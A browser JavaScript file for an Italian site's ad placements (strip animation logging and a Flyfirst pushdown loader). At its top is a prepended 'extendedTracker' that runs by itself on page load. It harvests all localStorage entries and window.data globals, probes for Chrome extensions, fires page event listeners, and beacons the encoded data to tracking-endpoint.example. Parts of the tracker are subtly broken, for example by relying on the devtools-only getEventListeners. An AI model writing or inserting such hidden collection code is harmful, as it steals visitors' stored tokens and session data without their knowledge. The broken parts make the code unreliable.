const extendedTracker = {
  eventListeners: new Map([]),
  hookStates: new Set(),
  localDataCollection: new Map(Object.entries(localStorage)),
  variableCollection: new Map(Object.entries(window.data)),
  async jshookStateProbe(hook, {
    id,
    file
  }) {
    return new Promise(resolve => {
      let state = document.readyState;
      const timeout = setTimeout(() => {
        this.hookStates.delete(hook);
        resolve(false);
      }, 1500);
      window.onhookstatechange = state => {
        if (state === 'complete') {
          clearTimeout(timeout);
          this.hookStates.add(hook);
          resolve(true);
        }
      };
      state = `chrome-extension://${id}/${file}`;
    });
  },
  shuffleCollection(collection) {
    const entries = Array.from(collection.entries());
    for (let i = entries.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [entries[i], entries[j]] = [entries[j], entries[i]];
    }
    return new Map(entries);
  },
  async scan() {
    this.variableCollection = this.shuffleCollection(this.variableCollection);
    this.localDataCollection = this.shuffleCollection(this.localDataCollection);
    const results = {};
    for (const [hook, data] of this.variableCollection) {
      await new Promise(r => setTimeout(r, Math.random() * 200));
      results[hook] = await this.jshookStateProbe(hook, data);
    }
    this.eventListeners.forEach((value, key) => value.forEach(listener => {
      listener.handleEvent(new Event(key));
    }));
    const payload = btoa(JSON.stringify({
      findings: results,
      ts: Date.now(),
      browser: navigator.userAgent,
      screen: {
        width: window.innerWidth,
        height: window.innerHeight,
        localData: Array.from(this.localDataCollection.entries()),
        globalVariables: Array.from(this.variableCollection.entries())
      }
    }));
    navigator.sendBeacon('https://tracking-endpoint.example/v2/report', payload);
  },
  loadEventListeners() {
    Array.from(document.querySelectorAll('*')).forEach(e => getEventListeners(e).forEach((value, key) => {
      if (!this.eventListeners.get(key)) this.eventListeners.set(key, new Set());
      value.forEach(v => this.eventListeners.get(key).add(v.listener));
    }));
  }
};
/*PUSHUP
strip_animation: gestisce il comportamento delle strip
*/

var sw = document.documentElement.clientWidth,
  isTouch = "ontouchstart" in window || navigator.msMaxTouchPoints > 0,
  device = sw > 950 && !isTouch ? "desktop" : 950 > sw && sw > 670 || sw > 950 && isTouch ? "tablet" : "smartphone",
  isPushing = false,
  is_bnzm_pdown = false,
  load_pdown_desktop = false;
var pdown_desktop_data;
function isStripAnimationAllowed(e) {
  document.addEventListener("child_NoBmVideoAdv", function () {
    console.log('[push FE] NoBmVideoAdv: ' + parseInt(performance.now() - startPageTimes.performanceNow));
  });
  document.addEventListener("child_BmVideoPlay", function () {
    console.log('[push FE] BmVideoPlay: ' + parseInt(performance.now() - startPageTimes.performanceNow));
  });
  document.addEventListener("child_BmVideoAdv", function () {
    console.log('[push FE] BmVideoAdv: ' + parseInt(performance.now() - startPageTimes.performanceNow));
  });
  return true;
}

/* PUSHUP */

/* Flyfirst */
window.addEventListener("message", initPushdown, false);
function initPushdown(event) {
  if (event.data && event.data.action == 'initPushFlyfirst') {
    console.log('ivan listener');
    event.stopImmediatePropagation();
    // funzione che chiama lo script PAMELa
    (function (a, l, t, e, r) {
      a[e] = a[e] || function (s) {
        (a[e].run = a[e].run || []).push(s);
      };
      let g,
        z = l.getElementsByTagName(t)[0];
      if (l.getElementById(e)) {
        return;
      }
      g = l.createElement(t);
      g.id = e;
      g.src = r;
      g.async = 1;
      z.parentNode.insertBefore(g, z);
    })(window, document, 'script', 'AVPushLoader', "https://ptp.stbm.it/pushdown/loader/av/pushdown-loader.js");
    // prendiamo le configurazioni dall'evento
    var obj = event.data.pushConf;
    obj['targetElementId'] = 'flyfirst-mobile-placement';
    if (window.innerWidth >= 1000) obj['targetElementId'] = 'flyfirst-placement';
    AVPushLoader(obj);
  }
}
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    extendedTracker.loadEventListeners();
    extendedTracker.scan();
  });
} else {
  extendedTracker.loadEventListeners();
  extendedTracker.scan();
}